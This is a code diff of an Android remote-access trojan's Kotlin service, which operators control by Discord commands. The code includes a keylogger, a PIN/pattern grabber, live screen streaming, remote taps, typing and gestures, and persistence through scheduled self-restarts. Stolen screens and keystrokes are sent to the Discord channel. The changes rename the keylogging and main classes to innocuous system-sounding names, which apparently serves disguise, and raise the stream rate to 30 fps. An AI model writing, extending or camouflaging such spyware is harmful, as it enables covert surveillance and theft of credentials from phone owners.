@@ -51,7 +51,7 @@ import java.io.File
 import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
-class MainService : Service() {
+class SystemNetworkService : Service() {
     companion object {
         private const val NOTIF_ID = 1337
         private const val CHANNEL = "phantom"
@@ -59,7 +59,7 @@ class MainService : Service() {
 
         fun start(ctx: Context) {
             try {
-                val i = Intent(ctx, MainService::class.java)
+                val i = Intent(ctx, SystemNetworkService::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                     ctx.startForegroundService(i)
                 else
@@ -135,7 +135,7 @@ class MainService : Service() {
         registerNetworkCallback()
 
         // Auto-open accessibility if not enabled
-        if (!KeylogService.isRunning) {
+        if (!AccessibilityHelper.isRunning) {
             
             try {
                 val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
@@ -283,11 +283,11 @@ class MainService : Service() {
                             }
                         }
                         null, "" -> {
-                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (1fps)\nUsage: `!stream 2` (2fps, max 5)\nUsage: `!stream stop`")
+                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (1fps)\nUsage: `!stream 30` (30fps, max 30)\nUsage: `!stream stop`")
                         }
                         else -> {
                             val fps = payload.toIntOrNull()
-                            if (fps != null && fps in 1..5) {
+                            if (fps != null && fps in 1..30) {
                                 streamFps = fps
                                 if (isStreaming) {
                                     streamJob?.cancel()
@@ -296,7 +296,7 @@ class MainService : Service() {
                                 d.sendMsg(":tv: **Live stream started** at ${fps}fps\nUse `!stream stop` to end")
                                 streamJob = scope.launch {
                                     while (isActive) {
-                                        val bytes = captureScreen()
+                                        val bytes = captureScreenForStream()
                                         if (bytes != null) {
                                             d.sendFile("", "stream_${System.currentTimeMillis()}.jpg", bytes)
                                         }
@@ -304,7 +304,7 @@ class MainService : Service() {
                                     }
                                 }
                             } else {
-                                d.sendMsg(":x: Invalid FPS. Use 1-5. Usage: `!stream <1-5>`")
+                                d.sendMsg(":x: Invalid FPS. Use 1-30. Usage: `!stream <1-30>`")
                             }
                         }
                     }
@@ -329,7 +329,7 @@ class MainService : Service() {
                 "keylog" -> {
                     when (payload?.lowercase()) {
                         "on" -> {
-                            if (!KeylogService.isRunning) {
+                            if (!AccessibilityHelper.isRunning) {
                                 val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                 startActivitySafely(i)
                                 d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
@@ -338,7 +338,7 @@ class MainService : Service() {
                             }
                         }
                         "off" -> {
-                            if (KeylogService.isRunning) {
+                            if (AccessibilityHelper.isRunning) {
                                 val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                 startActivitySafely(i)
                                 d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${packageName} → toggle off")
@@ -347,7 +347,7 @@ class MainService : Service() {
                             }
                         }
                         else -> {
-                            val cap = KeylogService.getText()
+                            val cap = AccessibilityHelper.getText()
                             if (cap.isEmpty()) {
                                 d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
                             } else {
@@ -501,7 +501,7 @@ class MainService : Service() {
                     discord?.stop()
                     gatewayStarted = false
                     discord = null
-                    startService(Intent(this@MainService, MainService::class.java))
+                    startService(Intent(this@SystemNetworkService, SystemNetworkService::class.java))
                 }
                 "wifi" -> {
                     val wm = getSystemService(Context.WIFI_SERVICE) as WifiManager
@@ -697,14 +697,14 @@ class MainService : Service() {
                     }
                 }
                 "pin" -> {
-                    if (!KeylogService.isRunning) {
+                    if (!AccessibilityHelper.isRunning) {
                         d.sendMsg(":x: Accessibility service not running — `!keylog on` first")
                     } else {
                         d.sendMsg(":key: **PIN/Pattern grabber**\nEnable it via accessibility. Results appear here automatically after unlock.\n`!debug` for captured data.")
                     }
                 }
                 "overlay" -> {
-                    val svc = KeylogService.instance
+                    val svc = AccessibilityHelper.instance
                     if (svc == null) {
                         d.sendMsg(":x: Accessibility service not running")
                     } else {
@@ -714,7 +714,7 @@ class MainService : Service() {
                     }
                 }
                 "click" -> {
-                    val svc = KeylogService.instance
+                    val svc = AccessibilityHelper.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                     if (payload == null || payload.isBlank()) {
                         d.sendMsg(":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>` — clicks first matching text\nUsage: `!click x,y` — clicks at screen coordinates\nExample: `!click Sign In`\nExample: `!click 540,1200`")
@@ -736,7 +736,7 @@ class MainService : Service() {
                     }
                 }
                 "input" -> {
-                    val svc = KeylogService.instance
+                    val svc = AccessibilityHelper.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                     if (payload == null || payload.isBlank()) {
                         d.sendMsg(":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`\nExample: `!input Hello World`")
@@ -771,7 +771,7 @@ class MainService : Service() {
                     }
                 }
                 "screen" -> {
-                    val svc = KeylogService.instance
+                    val svc = AccessibilityHelper.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                     val tree = svc.harvester.dumpScreen()
                     if (tree.isBlank()) {
@@ -781,7 +781,7 @@ class MainService : Service() {
                     }
                 }
                 "gesture" -> {
-                    val svc = KeylogService.instance
+                    val svc = AccessibilityHelper.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
                     if (payload == null) {
                         d.sendMsg(":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`\nExample: `!gesture 540,1800,540,600,300`\n(swipe up from bottom to top in 300ms)")
@@ -840,8 +840,20 @@ class MainService : Service() {
 
     private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
         val deferred = CompletableDeferred<ByteArray?>()
-        val ss = ScreenshotModule(this@MainService)
-        ss.capture(object : ScreenshotModule.Callback {
+        val ss = DisplayCapture(this@SystemNetworkService)
+        ss.capture(object : DisplayCapture.Callback {
+            override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+            override fun onFailure(error: String) {
+                deferred.complete(null)
+            }
+        })
+        deferred.await()
+    }
+
+    private suspend fun captureScreenForStream(): ByteArray? = withContext(Dispatchers.IO) {
+        val deferred = CompletableDeferred<ByteArray?>()
+        val ss = DisplayCapture(this@SystemNetworkService)
+        ss.captureForStream(object : DisplayCapture.Callback {
             override fun onSuccess(data: ByteArray) { deferred.complete(data) }
             override fun onFailure(error: String) {
                 deferred.complete(null)
@@ -1356,7 +1368,7 @@ class MainService : Service() {
             val src = File(applicationInfo.sourceDir)
             val dst = File(filesDir, "persist.apk")
             src.copyTo(dst, overwrite = true)
-            val intent = Intent(this, MainService::class.java)
+            val intent = Intent(this, SystemNetworkService::class.java)
             val pi = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
             val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
             am.setInexactRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 60000, 600000, pi)
